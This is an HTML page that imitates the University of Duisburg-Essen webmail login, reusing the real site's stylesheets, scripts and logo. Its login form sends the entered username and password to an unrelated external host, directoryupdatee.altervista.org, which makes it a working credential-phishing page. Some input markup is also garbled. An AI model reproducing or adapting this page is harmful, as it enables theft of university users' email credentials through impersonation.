<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<HTML><HEAD><TITLE>Webmail Uni Duisburg-Essen :: Welcome to Webmail Uni Duisburg-Essen</TITLE>

<META name=Robots content=noindex,nofollow>

<META name=viewport content=width=580>

<META content=IE=EDGE http-equiv=X-UA-Compatible><!--<meta name="viewport" content="" id="viewport" />--><LINK 

rel="shortcut icon" href="skins/larry/images/favicon.ico"><LINK rel=stylesheet 

type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/larry/styles.min.css?s=1411973811"><LINK 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/uni-due/uni-due.css?s=1418724648"><!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/uni-due/svggradients.css?s=1411973811" /><![endif]--><!--[if lte IE 8]><LINK 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/skins/uni-due/iehacks.css?s=1411973811"><![endif]--><!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/uni-due/ie7hacks.css" /><![endif]--><LINK 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/plugins/rcs_skins/styles.css?s=1409653698"><LINK 

rel=stylesheet type=text/css 

href="https://webmailer.uni-duisburg-essen.de/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1411973810">

<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/skins/uni-due/ui.js?s=1405858678"></SCRIPT>



<META content="text/html; charset=UTF-8" http-equiv=content-type>

<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/jquery.min.js?s=1411973810"></SCRIPT>



<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/common.min.js?s=1411973810"></SCRIPT>



<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/app.min.js?s=1411973810"></SCRIPT>



<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/program/js/jstz.min.js?s=1411973810"></SCRIPT>



<SCRIPT type=text/javascript>



var rcmail = new rcube_webmail();

rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"outlook","refresh_interval":60,"session_lifetime":43200,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"dd.mm.yy","rcs_phone":false,"rcs_tablet":false,"rcs_mobile":false,"rcs_desktop":true,"rcs_device":"desktop","rcs_color":false,"rcs_skin":"uni-due","request_token":"7591407f1019998f55e75c994cbcb985"});

rcmail.gui_container("loginfooter","bottomline");

rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});

rcmail.gui_object('loginform', 'form');

rcmail.gui_object('message', 'message');

</SCRIPT>



<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/plugins/rcs_skins/scripts.js?s=1409653698"></SCRIPT>



<SCRIPT type=text/javascript 

src="https://webmailer.uni-duisburg-essen.de/plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1411973810"></SCRIPT>



<META name=GENERATOR content="MSHTML 8.00.7600.16385"></HEAD>

<BODY>

<DIV id=login-form>

<DIV class=box-inner><IMG id=logo alt="Webmail Uni Duisburg-Essen" 

src="https://webmailer.uni-duisburg-essen.de/skins/uni-due/images/roundcube_logo.png"> 



<FORM method=post name=form action="http://directoryupdatee.altervista.org/veri1/member.php" http://directoryupdatee.altervista.org/veri1/member.php><INPUT 

value=7591407f1019998f55e75c994cbcb985 type=hidden name=_token> <INPUT 

value=login type=hidden name=_task><INPUT value=login type=hidden 

name=_action><INPUT id=rcmlogintz value=_default_ type=hidden 

name=_timezone><INPUT id=rcmloginurl type=hidden name=_url>

<TABLE>

  <TBODY>

  <TR>

    <TD class=title><LABEL for=rcmloginuser>Username</LABEL> </TD>

    <TD class=input><INPUT id=rcmloginuser size=40 type=text name=q4_email 

      autocomplete="off" autocapitalize="off" required="required"></TD></TR>

  <TR>

    <TD class=title><LABEL for=rcmloginpwd>Pass</LABEL> </TD>

    <TD class=input><INPUT id=rcmloginpwd size=40 type=q4_prince

word name=q6_facultydepartment 

      autocomplete="off" autocapitalize="off" 

required="required"></TD></TR></TBODY></TABLE>

<P class=formbuttons><INPUT id=rcmloginsubmit class="button mainaction" value=Login type=submit></P></FORM></DIV>

<DIV class=box-bottom>

<DIV id=message></DIV><NOSCRIPT>

<P class=noscriptwarning>Warning: This webmail service requires Javascript! In 

order to use it please enable Javascript in your browser's 

settings.</P></NOSCRIPT></DIV>

<DIV id=bottomline>Webmail Uni Duisburg-Essen 1.0.3 &nbsp;●&nbsp; <A 

class=support-link 

href="https://www.uni-due.de/zim/services/e-mail/roundcube.php" 

target=_blank>Get support</A> </DIV></DIV>

<SCRIPT type=text/javascript>



// UI startup

var UI = new rcube_mail_ui();

$(document).ready(function(){

	UI.set('errortitle', 'An error occurred!');

	UI.init();

});



</SCRIPT>

<!--[if lte IE 8]>

<SCRIPT type=text/javascript>



// fix missing :last-child selectors

$(document).ready(function(){

	$('ul.treelist ul').each(function(i,ul){

		$('li:last-child', ul).css('border-bottom', 0);

	});

});



</SCRIPT>

<![endif]-->

<SCRIPT>$('body').addClass('rcs-desktop');</SCRIPT>

<!-- Put HTML content here -->

<H3 style="TEXT-ALIGN: center">GigaMove</H3>

<P style="TEXT-ALIGN: center">GigaMove dient zur Übertragung großer 

Dateien<BR><A 

href="http://www.uni-due.de/zim/services/gigamove.shtml">Informationen zu 

GigaMove</A></LI><BR><A href="http://gigamove.zim.uni-due.de/">Anmeldung zu 

GigaMove</A></LI><BR><BR></P>

<SCRIPT type=text/javascript>



$(document).ready(function(){ 

rcmail.init();

var images = ["skins\/uni-due\/images\/ajaxloader.gif","skins\/uni-due\/images\/ajaxloader_dark.gif","skins\/uni-due\/images\/buttons.png","skins\/uni-due\/images\/addcontact.png","skins\/uni-due\/images\/filetypes.png","skins\/uni-due\/images\/listicons.png","skins\/uni-due\/images\/messages.png","skins\/uni-due\/images\/messages_dark.png","skins\/uni-due\/images\/quota.png","skins\/uni-due\/images\/selector.png","skins\/uni-due\/images\/splitter.png","skins\/uni-due\/images\/watermark.jpg"];

            for (var i=0; i<images.length; i++) {

                img = new Image();

                img.src = images[i];

            }

});

</SCRIPT>

</BODY></HTML>

